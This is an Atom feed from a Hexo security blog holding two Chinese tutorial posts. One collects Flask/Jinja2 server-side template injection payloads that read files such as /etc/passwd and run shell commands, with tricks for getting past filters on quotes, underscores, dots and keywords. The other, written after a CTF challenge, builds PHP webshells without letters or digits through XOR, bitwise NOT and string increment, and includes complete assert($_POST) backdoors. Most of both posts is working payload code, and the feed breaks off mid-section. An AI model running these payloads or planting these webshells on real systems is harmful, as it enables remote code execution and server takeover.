<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kath4rs1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-25T17:38:12.916Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Flask ssti模板注入一些总结</title>
    <link href="http://yoursite.com/2020/07/25/ssti-1/"/>
    <id>http://yoursite.com/2020/07/25/ssti-1/</id>
    <published>2020-07-25T06:39:38.000Z</published>
    <updated>2020-07-25T17:38:12.916Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ssti思路"><a href="#ssti思路" class="headerlink" title="ssti思路"></a>ssti思路</h1><p>服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，<a id="more"></a>在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>ssti模板注入的基本思路就是通过<code>__class__</code>属性找到基类object，通过<code>__subclasses__()</code>查看object中有哪些类可以使用，一般都是去寻找os类，然后通过<strong>blobals</strong>全局来查找所有的方法及变量及参数，通常用到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类的<code>popen</code>方法。</p><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><h2 id="首先获取基本类"><a href="#首先获取基本类" class="headerlink" title="首先获取基本类"></a>首先获取基本类</h2><p>首先通过str、dict、tuple或list等获取python的基本类</p><ul><li><strong>dict</strong>：保存类实例或对象实例的属性变量键值对字典</li><li><strong>class</strong>：返回调用的参数类型</li><li><strong>mro</strong>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li><li><strong>bases</strong>：返回类型列表</li><li><strong>subclasses</strong>：返回object的子类</li><li><strong>init</strong>：类的初始化方法</li><li><strong>globals</strong>：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li></ul><p>也可以用一些其他在jinja2中存在的对象，比如<code>request</code>。在Python中，每个类都有一个<strong>bases</strong>属性，列出其基类，而<strong>mro</strong>返回的时解析方法调用的顺序，在其中选择<strong>object</strong>类就好了。</p><ul><li><code>&#39;&#39;.__class__.__base__</code></li><li><code>&#39;&#39;.__class__.__mro__[1]</code></li><li><code>&quot;&quot;.__class__.__bases__[0]</code></li><li><code>().__class__.__bases__[0]</code></li><li><code>[].__class__.__bases__[0]</code></li><li><code>{}.__class__.__mro__[1]</code></li><li><code>request.__class__.__mro__[1]</code></li></ul><p>可以借助```<strong>getitem</strong>绕过中括号的限制：</p><ul><li><code>&#39;&#39;.__class__.__mro__.__getitem__(1)</code></li><li><code>{}.__class__.__bases__.__getitem__(0)</code></li><li><code>().__class__.__bases__.__getitem__(0)</code></li><li><code>request.__class__.__mro__.__getitem__(1)</code></li></ul><h2 id="寻找方法"><a href="#寻找方法" class="headerlink" title="寻找方法"></a>寻找方法</h2><p>获取基本类后，继续向下获取基本类<code>object</code>的子类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure><p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__)</span><br><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[1].__init__)</span><br><span class="line">输出：</span><br><span class="line">&lt;function BlueprintSetupState.__init__ at 0x038CE0C0&gt;</span><br><span class="line">&lt;slot wrapper &#39;__init__&#39; of &#39;weakref&#39; objects&gt;</span><br></pre></td></tr></table></figure><p>查看其引用<strong>builtins</strong><br>Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;]</span><br></pre></td></tr></table></figure><p>这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 open （python2中是file）以实现读取文件的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;D:\\test.txt&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>在python2中使用file读写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#读文件：</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写文件：</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br></pre></td></tr></table></figure><p>在python3中file没有了，使用open：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#读文件：</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;D:\\test.txt&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="1-popen"><a href="#1-popen" class="headerlink" title="1.popen"></a>1.popen</h3><p>使用<code>popen</code>进行命令执行。<br>首先要先找到<code>os._wrap_close</code>类，<br>查看 os._wrap_close 方法的位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[1].__subclasses__().index(os._wrap_close)</span><br><span class="line">132</span><br></pre></td></tr></table></figure><p>返回了下标索引，直接调用它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h3 id="2-eval"><a href="#2-eval" class="headerlink" title="2.eval"></a>2.eval</h3><p>使用<code>eval</code>进行命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</span><br></pre></td></tr></table></figure><h3 id="3-warnings-catch-warnings"><a href="#3-warnings-catch-warnings" class="headerlink" title="3.warnings.catch_warnings"></a>3.warnings.catch_warnings</h3><p>利用warnings.catch_warnings 进行命令执行。<br>这个在python2和python3中有些不同，先说Python2的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</span><br></pre></td></tr></table></figure><p>然后是Python3的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)</span><br></pre></td></tr></table></figure><p>或者也可以这样多行执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="4-subprocess"><a href="#4-subprocess" class="headerlink" title="4.subprocess"></a>4.subprocess</h3><p>这个模块原本在python2中是<code>commands</code>，在python中被替换为<code>subprocess</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).getstatusoutput(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>现在很多模板注入都有限制，比如限制输入某些关键字，或者干脆直接限制输入某些字符。下面总结了一些绕过的方法。</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h2><p>使用getitem()或者pop()绕过，如：<code>&quot;&quot;.__class__.__bases__[0]</code><br>绕过后：<code>&quot;&quot;.__class__.__bases__.getitem(0)</code></p><p>读文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__.__subclasses__().pop(-1).__init__.__globals__.pop(&#39;__builtins__&#39;).pop(&#39;open&#39;)(&#39;test.txt&#39;).read()</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__base__.__subclasses__().pop(132).__init__.__globals__.pop(&#39;popen&#39;)(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>request.args 是 flask 中的一个属性，为返回请求的参数，这里把<code>popen</code>和<code>cmd</code>当作变量名，将值传进来，进而绕过了引号的过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(117).__init__.__globals__[request.args.popen](request.args.cmd).read()&#125;&#125;&amp;popen&#x3D;popen&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><h2 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h2><p>也是动态传参绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[request.args.class][request.args.base][request.args.subclasses]()[117][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read()&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;subclasses&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;popen&#x3D;popen&amp;cmd&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p>比如过滤掉<code>subclasses</code>：</p><h3 id="使用request-args动态传参绕过"><a href="#使用request-args动态传参绕过" class="headerlink" title="使用request.args动态传参绕过"></a>使用<code>request.args</code>动态传参绕过</h3><p>比如过滤掉<code>subclasses</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0][request.args.a]()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)&#125;&#125;&amp;a&#x3D;__subclasses__</span><br><span class="line"># cookie传值</span><br><span class="line">&quot;&quot;.__class__.__bases__[0][request.cookies[&#39;var&#39;]]()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</span><br></pre></td></tr></table></figure><h3 id="使用base64编码绕过"><a href="#使用base64编码绕过" class="headerlink" title="使用base64编码绕过"></a>使用base64编码绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 编码前</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)</span><br><span class="line"># 编码后</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#39;ZXZhbA&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk&#x3D;&quot;.decode(&#39;base64&#39;))</span><br></pre></td></tr></table></figure><h3 id="使用字符串拼接绕过"><a href="#使用字符串拼接绕过" class="headerlink" title="使用字符串拼接绕过"></a>使用字符串拼接绕过</h3><p>使用加号来拼接字符串，<code> = </code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__[&#39;__subcl&#39;+&#39;asses__&#39;]()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>使用join连接字符串，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="过滤点号"><a href="#过滤点号" class="headerlink" title="过滤点号"></a>过滤点号</h2><p>jinja2模板中有很多有用的内置过滤器，这里使用的是<code>attr</code>和<code>join</code>这两个过滤器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;&#96;&#96;&#96;就相当于&#96;&#96;&#96;&#123;&#123;request.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><h2 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h2><blockquote><p>服务器端模板注入和代码注入检测与开发工具</p></blockquote><p>一个 python 工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用 SSTI 来访问目标文件或操作系统。一些受支持的模板引擎包括 PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p><p>神器</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ssti思路&quot;&gt;&lt;a href=&quot;#ssti思路&quot; class=&quot;headerlink&quot; title=&quot;ssti思路&quot;&gt;&lt;/a&gt;ssti思路&lt;/h1&gt;&lt;p&gt;服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，
    
    </summary>
    
    
      <category term="python ssti" scheme="http://yoursite.com/categories/python-ssti/"/>
    
    
      <category term="ssti" scheme="http://yoursite.com/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字构造webshell的学习</title>
    <link href="http://yoursite.com/2020/07/23/webshell/"/>
    <id>http://yoursite.com/2020/07/23/webshell/</id>
    <published>2020-07-23T11:37:52.000Z</published>
    <updated>2020-07-23T16:42:47.135Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近碰到一道题，便学习了一下相关无字母数字构造webshell的知识。题目如下：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目中可以看到字母和数字是没法使用的，而且payload长度必须在40以内。我们需要绕过正则过滤，利用不可见字符或者正则表达式遗漏的字符通过各种变换来构造出a-z中的任意一个字符，并且长度小于40，然后再利用php允许动态函数执行的特点，拼接出一个函数名，然后动态执行之即可。<br>那么，我们现在的问题就是如何通过各种变换，是的我们能够成功构造出所需的函数，然后拿到webshell。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="php5和7的差异："><a href="#php5和7的差异：" class="headerlink" title="php5和7的差异："></a>php5和7的差异：</h2><p>php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。</p><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><p>(1)代码中没有引号的字符都自动作为字符串<br>    我猜这也是为什么传马的时候<code>$_GET[&#39;cmd&#39;]</code>和<code>$_GET[cmd]</code>都可以</p><p>(2)Ascii码大于 0x7F 的字符都会被当作字符串</p><p>(3)php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型</p><p>(4)在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理<br>所以有<code>${_GET}{cmd}</code></p><h2 id="不使用数字字母构造数字"><a href="#不使用数字字母构造数字" class="headerlink" title="不使用数字字母构造数字"></a>不使用数字字母构造数字</h2><p>利用了php弱类型的特性，true的值为1，所以true+true==2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);  &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;  &#x2F;&#x2F;$_&#x3D;1</span><br></pre></td></tr></table></figure><p>在php中未定义的变量默认值为null，null==false==0，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++; </span><br><span class="line">&#x2F;&#x2F;$_&#x3D;1</span><br></pre></td></tr></table></figure><p>也可以用!操作符来进行布尔类型的转换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo !$_;</span><br><span class="line">&#x2F;&#x2F;这个代码将输出1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h1><p>构造无字母数字webshell一般用到下面这几种方法：</p><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在php中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，想得到a-z中的某个字母，就找到某两个非字母、数字的字符，他们异或的结果是这个字母即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;A&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：~</span><br></pre></td></tr></table></figure><p>输出的结果是字符”~”，这是因为代码对字符”A”和字符”?”进行了异或操作。在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。<br>例如下面这个php后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;:&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;[&#39;).(&#39;&gt;&#39;^&#39;[&#39;).(&#39;)&#39;^&#39;[&#39;).(&#39;&#x2F;&#39;^&#39;[&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;+&#39;^&#39;&#123;&#39;).(&#39;&#x2F;&#39;^&#39;&#96;&#39;).(&#39;(&#39;^&#39;&#123;&#39;).(&#39;&#x2F;&#39;^&#39;&#123;&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="/images/20200723230637.png" alt=""></p><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>来看一个汉字”和”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure><p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。<br>因此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">两个写法性质一样</span><br><span class="line">结果会输出： ss</span><br></pre></td></tr></table></figure><p>py脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def get(shell):</span><br><span class="line">     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">     print(hexbit)</span><br><span class="line"></span><br><span class="line">get(&#39;phpinfo&#39;)</span><br><span class="line">#0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure><p>直接贴出p神的webshell吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);  &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;  &#x2F;&#x2F;$_&#x3D;1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);    &#x2F;&#x2F;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);   &#x2F;&#x2F;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;   &#x2F;&#x2F;$_POST</span><br><span class="line">$____($_[$__]);    &#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure><p>这里也有一种简短的写法${~”\xa0\xb8\xba\xab”}它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。</p><h2 id="利用字符串自增-自减"><a href="#利用字符串自增-自减" class="headerlink" title="利用字符串自增/自减"></a>利用字符串自增/自减</h2><p>php的小技巧，先看文档：<a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a><br><img src="/images/20200723234649.png" alt=""><br>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 